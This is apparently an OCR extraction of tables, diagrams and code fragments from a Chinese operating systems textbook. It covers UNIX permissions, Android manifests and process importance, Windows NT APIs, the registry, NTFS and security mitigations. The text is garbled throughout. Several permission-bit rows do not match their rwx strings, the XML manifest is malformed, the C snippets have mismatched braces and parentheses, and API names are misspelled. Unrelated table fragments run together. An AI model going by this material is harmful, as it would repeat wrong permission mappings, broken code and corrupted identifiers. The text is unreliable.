111000000 rWXx 所有者可以读、写和执行
111111000 rwxrwx--- 所有者和组可以读、写和执行
110100100 rW-r----- 所有者可以读和写；组可以读
110100100 rW-r--I-- 所有者可以读和写；其他人可以读
111101101 rwXr-Xr-X 所有者拥有所有权限，其他人可以读和执行
000000000 --------- 所有人都不拥有任何权限
000000111 ------rWX 只有组以外的其他用户拥有所有权限(奇怪但是合法)
系统调用 描 述
s=chmod(path,mode) 改变文件的保护模式
s=access(path,mode) 使用真实的UID和GID测试访问权限
uid=getuid() 获取真实的UID
uid=geteuid() 获取有效UID
gid=getgid() 获取真实的GID
gid=getegid() 获取有效GID
s=chown(path,owner,group) 改变所有者和组
s=setuid(uid) 设置UID
s=setgid(gid) 设置GID
进程1 对象1a
对象1b
句柄1 句柄2 进程2 对象2a
对象2b
句柄1 句柄2
句柄3 对象2a
对象2b
句柄2 句柄3
package android.os
interface IServiceManager{
IBinder getService(String name);
void addService(String name,IBinder binder); }
<?
xml version="1.0"encoding="utf-8"?
>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.emai!
"> <application>
<activity android:name="com.example.email.MailMainActivity"> <intent-filter>
<action android:name="android.intent.action.MAIN"I>
<category android:name="android.intent.category.LAUNCHER"/ </intent-filter>
</activity>
<activity android:name="com.example.email.ComposeActivity"> <intent-filter>
<action android:name="android.intent.action.SEND“
<category android:name="android.intent.category.DEFAULT"/> <data android:mimeType="/*"/>
</intent-filter> </activity>
<service android:name="com.example.email.SyncService">
</service>
<receiver android:name="com.example.email.SyncControlReceiver"> <intent-filter>
<action android:name="android.intent.action.DEVICE_STORAGE LOW"/> </intent-filter>
<intent-filter>
<action android:name="android.intent.action.DEVICESTORAGE_OKAY"/> </intent-filter>
</receiver>
<provider android:name="com.example.email.EmailProvider"
,android:authorities="com.example.email.provider.email">
</provider>
</application> </manifest>
UID值 用途
0 根
1000 核心系统(system_server进程)
1013 底层媒体进程
2000 命令行界面访问
10000~19999 动态分配应用程序UID
100000 多用户由此开始
类别 描述 oom_adj
SYSTEM 系统和守护进程 -16
PERSISTENT 总在运行的应用程序进程 -12
FOREGROUND 正在与用户交互 0
VISIBLE 用户可见 1
PERCEPTIBLE 用户可感知 2
HOME 主界面/启动器进程 4
CACHED 未被使用的进程 5
进程 状态 重要程度
system 操作系统核心部分 SYSTEM
phone 为实现电话功能而总在运行 PERSISTENT
email 当前前景应用程序 FOREGROUND
media 因需要访问用户音乐媒体而被音乐应用程序使用 PERCEPTIBLE
download 正在为用户下载文件 SERVICE
launcher 应用程序启动器，未被使用 HOME
maps 先前使用过的地图应用程序 CACHED
进程 状态 重要程度
system 操作系统核心部分 SYSTEM
phone 为实现电话功能而总在运行 PERSISTENT
email 当前前景应用程序 FOREGROUND
media 因需要访问用户音乐媒体而被音乐应用程序使用 PERCEPTIBLE
download 正在为用户下载文件 SERVICE
launcher 应用程序启动器，未被使用 HOME
camera 先前使用过的相机应用程序 CACHED
maps 先前使用过的地图应用程序 CACHED+1
年份 MS-DOS 基于MS- D O S 的 Windows 基于NT的 Windows 现代 Windows 说 明
1981 1.0 最初是为IBM PC发布
1983 2.0 支持PC/XT
1984 3.0 支持PC/AT
1990 3.0 两年内销售1000万份
1992 3.1 只能在286或以上系统中运行
1993 NT 3.1
1995 7.0 95 嵌入在Windows 95中的MS-DOS
1996 NT 4.0
1998 98
2000 8.0 Me 2000 Windows Me不如Windows 98
2001 XP 替代了Windows 98
2006 Vista Vista不能代替XP
2009 7 在Vista基础上的重要升级
2012 8 第一个现代版本
2013 8.1 微软进入了快速发布节奏
年份 DEC操作系统 特性
1973 RSX-11M 16位、多用户、实时、交换性
1978 VAX/VMS 32位、虚拟内存
1987 VAXELAN 实时
1988 PRISM/Mica 在MIPS/Ultrix热潮中被取消
现代应用管理器
WinRT:NET/C++,WWA/JS
COM
程序容器
进程生命周期管理
现代中介进程
Win32子系统进程
(csrss.exe)
桌面管理器(explorer)
[.NET:基础类， GC]
GUI(shell32,user32,gdi32)
动态库(ole,rpc)
子系统API(kernel32)
NTOS执行体层
(ntoskrnl.exe)
对象类别 例子
同步 信号量、互斥量、事件、IPC端口、 I/O完成队列
I/O 文件、设备、驱动、定时器
程序 任务、进程、线程、节、标签
Win32 GUI 桌面、应用程序回调
NtCreateProcess(&ProcHandle,Access,SectionHandle,DebugPortHandle,ExceptPortHandle,..)
NtCreateThread(&ThreadHandle,ProcHandle,Access,ThreadContext,CreateSuspended,...)
NtAllocateVirtualMemory(ProcHandle,Addr,Size,Type,Protection,...)
NtMapViewOfSection(SectHandle,ProcHandle,Addr,Size,Protection,...)
NtReadVirtualMemory(ProcHandle,Addr,Size,...)
NtWriteVirtualMemory(ProcHandle,Addr,Size,...)
NtCreateFile(&FileHandle,FileNameDescriptor,Access,.…)
NtDuplicateObject(srcProcHandle,srcObjHandle,dstProcHandle,dstObjHandle,...)
Win32调用 原生NT API调用
CreateProcess NtCreateProcess
CreateThread NtCreateThread
SuspendThread NtSuspendThread
CreateSemaphore NtCreateSemaphore
ReadFile NtReadFile
DeleteFile NtSetInformationFile
CreateFileMapping NtCreateSection
VirtualAlloc NtAllocateVirtualMemory
MapViewOfFile NtMapViewOfSection
DumplicateHandle NtDuplicateObject
CloseHandle NtClose
储巢文件 挂载名称 使用
SYSTEM HKLMSYSTEM OS配置信息，供内核使用
HARDWARE HKLMHARDWARE 记录探测到的设备的内存储巢
BCD HKLM\BCD* 启动配置数据库
SAM HKLMSAM 本地用户账户信息
SECURITY HKLMSECURITY lass的账户和其他安全信息
DEFAULT HKLM_USERS\.DEFAULT 新用户的默认储巢
NTUSER.DAT HKLM_USERS\<user id> 用户相关的储巢，保存在home目录
SOFTWARE HKLMSOFTWARE COM注册的应用类
COMPONENTS HKLMCOMPONENTS sys.组件的清单和依赖
Win32 API函数 描述
RegCreateKeyEx 创建一个新的注册表键
RegDeleteKey 删除一个注册表键
RegOpenKeyEx 打开一个键并获得句柄
RegEnumKeyEx 列举某个键的下级副键
RegQueryValueEx 查询键内的数据值
2.
3.
打印机 中 ↑ 磁 盘 凝
C: 文件系统过滤器
C: 文件系统过滤器
C: 文件系统
C: 卷
C: 磁盘类设备
C: 磁盘分区 I/O管理器
文件系统过滤器驱动程序
文件系统过滤器驱动程序
NTFS驱动程序
卷管理器驱动程序
磁盘类驱动程序
磁盘微型端口驱动程序 D: 文件系统过滤器
D: 文件系统过滤器
D: 文件系统
D: 卷
D: 磁盘类设备
D: 磁盘分区 IRP
设备栈由设备对象 每一个设备对象都链接着 设备栈由设备对象组成，
组成，比如C: 带有入口点的驱动对象 比如D:
程序 使用时候 备注
Open 用于每个新的句柄 很少使用
Parse 用于扩展名字空间的对象类型 用于文件和注册表键
Close 最后句柄关闭 清除可见结果
Delete 最后一个指针撤销 对象将被删除
Security 得到或设置对象的安全描述符 保护
QueryName 得到对象名称 外核很少使用
目录 内容
?
查找类似C:的MS-DOS设备的查找起始位置
DosDevices 目录?
Device 所有I/O设备
ObjectTypes 如图11-21中列出的类型的对象
Windows 发送消息到所有Win32 GUI窗口的对象
BaseNamedObjects 用户创建的Win32对象，如信号量、互斥量等
Arcname 由启动装载器发现的分区名称
NLS FNational语言支持对象
FileSystem 文件系统驱动对象和文件系统识别对象
Security 安全系统的对象
KnownDLLs 较早开启和一直开启的关键共享库
类 型 描 述
Process 用户进程
Thread 进程里的线程
Semaphore 进程内部同步的信号量
Mutex 用来控制进入关键区域的二进制信号量
Event 具有持久状态(已标记信号未标记信号)的同步对象
ALPC Port 内部进程消息传递的机制
Timer 允许一个线程固定时间间隔休眠的对象
Queue 用来完成异步I/O通知的对象
Open file 关联到某个打开的文件的对象
Access token 某个对象的安全描述符
Profile 描述CPU使用情况的数据结构
Section 表述映射的文件的对象
Key 注册表关键字，用于把注册信息关联到某个对象管理名字空间
Object directory 对象管理器中一组对象的目录
Symbolic link 通过路径名引用到另一个对象管理器对象
Device 物理设备、总线、驱动或者卷实例的I/O设备对象
名 字 描 述 备 注
作业 共享一些限制与限额的进程的集合 在AppContainer中使用
进程 掌握资源的容器
线程 被内核调度的实体单位
纤程 在用户进程中被管理的轻量级线程 几乎不被使用
线程池 面向任务的编程模型 构建在线程的基础之上
用户态线程 允许用户态线程切换的抽象 对于线程的扩展
Win32 API函数 描 述
CreateProcess 创建一个新的进程
CreateThread 在已存在的进程中创建一个新的线程
CreateFiber 创建一个新的纤程
ExitProcess 终止当前进程及其全部线程
ExitThread 终止该线程
ExitFiber 终止该纤程
SwichToFiber 在当前线程中运行另一纤程
SetPriorityClass 设置进程的优先级类
SetThreadPriority 设置线程的优先级
CreateSemaphore 创建一个新的信号量
CreateMutex 创建一个新的互斥量
OpenSemaphore 打开一个现有的信号量
OpenMutex 打开一个现有的互斥量
WaitForSingleObject 等待一个单一的信号量、互斥量等
WaitForMultipleObjects 等待一系列已有句柄的对象
PulseEvent 设置事件为激活，再变成未激活
ReleaseMutex 释放互斥量使其他线程可以获得它
EnterCriticalSection 得到临界区的锁
leaveCriticalSection 释放临界区的锁
Win32进程类优先级 Win32进程类优先级 Win32进程类优先级 Win32进程类优先级 Win32进程类优先级 Win32进程类优先级
Win32线 程优先级 实时 高 高于标准 标准 低于标准 空闲
Win32线 程优先级 时间紧急 31 15 15 15 15 15
Win32线 程优先级 最高 26 15 12 10 8 6
Win32线 程优先级 高于标准 25 14 11 9 7 5
Win32线 程优先级 标准 24 13 10 8 6 4
Win32线 程优先级 低于标准 23 12 9 7 5 3
Win32线 程优先级 最低 22 11 8 6 4 2
Win32线 程优先级 空闲 16 1 1 1 1 1
Win32 API函数 描 述
VirtualAlloc 保留或提交一个区域
VirtualFree 释放或解除提交一个区域
VirtualProtect 改变在一个区域上的读/写/执行保护
VirtualQuery 查询一个区域的状态
VirtualLock 使一个区域常驻内存(即不允许被替换到外存)
VirtualUnlock 使一个区域以正常的方式参与页面替换策略
CreateFileMapping 创建一个文件映射对象并且可以选择是否赋予该对象一个名字
MapViewOfFile 映射一个文件(或一个文件的一个部分)到地址空间中
UnmapViewOfFile 从地址空间中删除一个被映射的文件
OpenFileMapping 打开一个之前创建的文件映射对象
物理页号 AVL G PAT D A PCD U / S 刀 P
I/O系统调用 描 述
NtCreateFile 打开一个新的或已存在的文件或设备
NtReadFile 从一个文件或设备上读取数据
NtWriteFile 把数据写到一个文件或设备
NtQueryDirectoryFile 请求关于一个目录的信息，包括文件
NtQueryVolumeInformationFile 请求关于一个卷的信息
NtSetVolumeInformationFile 修改卷信息
NtNotifyChangeDirectoryFile 当任何在此目录中或其子目录树中的文件被修改时执行完成
NtQueryInformationFile 请求关于一个文件的信息
NtSetInformationFile 修改文件信息
NtUnlockFile 解除区域锁
NtFsControlFile 对一个文件进行多种操作
NtFlushBuffersFile 把内存文件缓冲刷新到磁盘
NtCancelloFile 取消文件上未完成的I/O操作
NtDeviceloControlFile 对一个设备的特殊操作
1 KB-
,
第一个用户文件
保留，将来使用
保留，将来使用
保留，将来使用
保留，将来使用
$Extend扩展：配额等
$Upcase大小写转换表
$Secure 所有文件的安全描述符
$BadClus 坏块列表
$Boot 引导装载程序
$Bitmap 已用块位图
$ 根目录
$AttrDef 属性定义
$Volume 卷文件
SLogFile日志文件，为恢复用
$MfMirr MFT的镜像复本
SMft 主文件表
属 性 描 述
标准信息 标志位，时间戳等
文件名 Unicode文件名，可能重复用做MS-DOS格式名
安全描述符 废弃了。
安全信息现在用$Extend SSecure表示
属性列表 额外的MFT记录的位置，如果需要的话
对象ID 对此卷唯一的64位文件标识符
卷名 当前卷的名字(仅用于$Volume)
卷信息 卷版本(仅用于$Volume)
索引根 用于目录
索引分配 用于很大的目录
位图 用于很大的目录
日志工具流 控制记录日志到SLogFile
数据 数据流；可以重复
标准 信息 文件名 0 48 30 8 0 8 40 16 85 8 0 8 未使用
头部 过期时间 组 默认DACL 用户SID 组SID 受限SID 权限 身份模拟级别 完整度级别
Win32 API函数 描 述
InitializeSecurityDeseriptor 准备一个新的安全描述符
LookupAccountSid 查询指定用户名的SID
SetSecurityDescriptorOwner 设置安全描述符中的所有者的SID
SetSecurityDescriptorGroup 设置安全描述符中的组SID
InitializeAcl 初始化DACL或者SACL
DeleteAce 从DACL或者SACL删除ACE
SetSecurityDescriptorDacl 使DACL依附到一个安全描述符
缓解技术 描 述
异常处理 对异常处理程序代码的调用进行限制
不执行MMU保护 通过将代码标记为不执行来阻碍对有效载荷的攻击
ASLR 通过随机化地址空间使得ROP攻击难以实现
PatchGuard 检测试图修改内核数据的行为，如利用rootkit进行攻击
Windows更新 提供常规的安全补丁以减少漏洞
Windows Defender 内置的基本反病毒功能
偏移 0 1 2 3 4 5 6 7 8 910
磁盘地址50 51 52 22 24 25 26 53 54 -60
系统调用处理程序 系统调用处理程序 系统调用处理程序 系统调用处理程序 系统调用处理程序 系统调用处理程序
文件系统1 文件系统1 … … 文件系统m 文件系统m
虚拟内存 虚拟内存 虚拟内存 虚拟内存 虚拟内存 虚拟内存
驱 动 程序1 瞿率 … · 瞿
线程、线程调度、线程同步 线程、线程调度、线程同步 线程、线程调度、线程同步 线程、线程调度、线程同步 线程、线程调度、线程同步 线程、线程调度、线程同步
中断处理、上下文切换、MMU 中断处理、上下文切换、MMU 中断处理、上下文切换、MMU 中断处理、上下文切换、MMU 中断处理、上下文切换、MMU 中断处理、上下文切换、MMU
隐藏低层硬件 隐藏低层硬件 隐藏低层硬件 隐藏低层硬件 隐藏低层硬件 隐藏低层硬件
微内核 微内核 微内核 微内核 微内核 微内核 微内核
found=0;
for(p=&proc table[0];p<&proc table[PROC TABLE SIZE];p++){
if(p->proc_pid==pid){ found=1;
break; {
}
#define BYTE_SIZE 8
int bit_count(int byte) {
int i,count=0;
for(i=0;i<BYTE_SIZE;i++)
if(byte >>i)&1)count++; return(count);
( /*一个字节包含8个位*/
/*对一个字节中的位进行计数*/
1*返回和*/
3,8,13 3,8,13 26,4,9 90,2,6
3,8,13 3,8,13 4,19,20 4,6,9
4,6,9 10,30,8 5,8,1 22,2,0
10,11,5 4,2,17 88,4,3 66,4,43
路 径 节点号
/usr 6
/usr/ast 26
/usr/ast/mbox 6
/usr/ast/books 92
/usr/bal 45
/usr/bal/paper.ps 85
头 衔 职 责
首席程序员 执行体系结构设计并编写代码
副手 辅助首席程序员并为其提供咨询
行政主管 管理人员、预算、空间、设备、报告等
编辑 编辑文档，而文档必须由首席程序员编写
秘书 行政主管和编辑各需要一名秘书
程序文书 维护代码和文档档案
工具师 提供首席程序员需要的任何工具
测试员 测试首席程序员的代码
语言律师 兼职人员，他可以就语言向首席程序员提供建议